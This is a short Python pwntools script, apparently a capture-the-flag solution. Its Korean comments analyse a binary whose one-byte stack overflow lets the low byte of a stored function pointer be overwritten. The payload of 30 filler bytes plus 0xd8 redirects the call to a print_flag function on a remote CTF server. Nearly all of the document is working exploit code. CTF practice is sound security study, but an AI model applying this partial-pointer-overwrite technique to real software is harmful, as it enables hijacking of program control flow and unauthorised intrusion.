# -*- coding: utf-8 -*-

from pwn import *

#p = process('./offset')
p = remote("ctf.j0n9hyun.xyz", 3007)

# 실행하면 어떤 함수를 실행할것인지 물어보고, 
# select_func 함수에서 strncpy 함수를 통해 $ebp-0x2a 위치로 입력했던 값을 1f(31바이트) 만큼 복사시킨다.  
# strcmp 함수가 one 이라는 문자열을 입력했는지 비교, 맞다면 특정부분으로 점프한 다음, 
# ebp-0xc에 one 함수의 주소를 복사시킨다.
# 비교문의 결과가 같건 틀리건 eax 레지스터에 ebp-0xc에 들어있는 주소를 옮겨주고 call eax를 수행, 
# 해당 함수를 실행시킨다. 단순 bof로는 1바이트만 넘어가기 때문에 실행 흐름 조절이 어려워보인다. 
# 입력 위치와 0xc 까지 30바이트 거리라서 eax에 들어갈 주소가 0x565556까지는 고정, 
# bof가 1바이트만 발생해서 해당 주소의 마지막 1바이트만 변하기때문,
# 그러나, print_flag 함수가 0x565556d8 부터 호출되므로, 
# 마지막 1바이트를 d8로 넣어서 보낸다면 해당 함수를 실행시킬 수 있을것 같다.

payload = "a"*30 + "\xd8"

p.sendlineafter("call?",payload)
p.interactive()